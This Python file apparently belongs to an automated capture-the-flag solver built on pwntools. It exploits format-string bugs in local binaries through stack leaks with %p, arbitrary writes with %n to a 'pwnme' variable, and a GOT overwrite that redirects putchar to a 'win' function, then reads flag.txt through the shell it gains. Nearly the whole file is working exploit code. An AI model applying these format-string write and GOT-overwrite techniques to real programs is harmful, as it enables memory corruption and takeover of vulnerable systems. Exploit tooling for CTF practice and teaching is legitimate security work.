from pwn import *

logging.getLogger('pwnlib').setLevel(logging.WARNING)

fire = "\U0001F525"

class FMT:
    def __init__(self, analysis):
        self.analysis = analysis
        self.filename = analysis.binary
        self.e = ELF(self.filename)

    
    def build_exploit(self):
        payload = None
        
        if not self.stack_leak():
            if self.analysis.vuln_has_cmp():
                self.write_prim()
            elif self.analysis.has_putchar():
                self.got_overwrite()

    def stack_leak(self):
        hex_vals = []
        
        # TODO: Variable length
        for i in range(100):
            
            p = process(self.filename)
            p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
            try:
                for i in p.recvline().decode('utf-8').split(' '):
                    if '0x' in i:
                        string = p64(int(i.strip('\n'), 16))
                        hex_vals.append(string.decode('utf-8'))
            except UnicodeDecodeError as e:
                next
            except EOFError:
                break
            p.close()
        
        vals = ''.join(hex_vals)
        if "flag" in vals:
            start = vals.find("flag")
            end = vals.find("}")
            flag = vals[start:end+1]
            flag_stripped = flag.strip("\n")
            fart_print.success(f"{self.filename}: {flag_stripped}")
            return True
        else:
            return False

    def write_prim(self):
        offset = self.find_write_prim_offset()
        if offset:
            # Find the value
            val = self.analysis.get_vuln_args()
            pwnme = p64(self.e.sym["pwnme"])
            payload = f"%{val}d%{offset+1}$n".encode("utf-8")
            payload += self.get_padding(len(payload))
            payload += pwnme

            p = process(self.filename)
            p.sendline(payload)
        
            self.print_flag(p)

    def find_write_prim_offset(self):
        offset = None
        for x in range(100):
            p = process(self.filename)

            payload = f"%{x}$p".encode('utf-8')
            payload += self.get_padding(len(payload))
            payload += b"\xef\xbe\xad\xde"*2
            p.sendline(payload)
            p.recvuntil(b"<<<")
            if b"0xdeadbeefdeadbeef" in p.recvline():
                offset = x
            p.close()

        return offset
    
    def get_padding(self, size):
        return b"A"*(8 - (size % 8))

    def libc_leak(self):
        pass

    def got_overwrite(self):
        offset = self.find_write_prim_offset()
        if offset:
            win = self.e.sym['win']
            putchar = p64(self.e.got['putchar'])

            payload = f"%{win}d%{offset+1}$n".encode('utf-8')
            payload += self.get_padding(len(payload))
            payload += putchar
            
            p = process(self.filename)
            p.sendline(payload)

            self.print_flag(p)

    def print_flag(self, p): 
        if self.analysis.has_catflagtxt():
            p.recvuntil(b"<<<")
            p.recvline()

            flag = p.recvline().decode('utf-8').strip('\n')
            fart_print.success(f"{self.filename}: flag{flag}")
        elif self.analysis.has_binsh():
            p.sendline(b"cat flag.txt")
            p.recvuntil(b"flag")
            flag = p.recvline().decode('utf-8').strip('\n')
            fart_print.success(f"{self.filename}: flag{flag}")

        p.close()
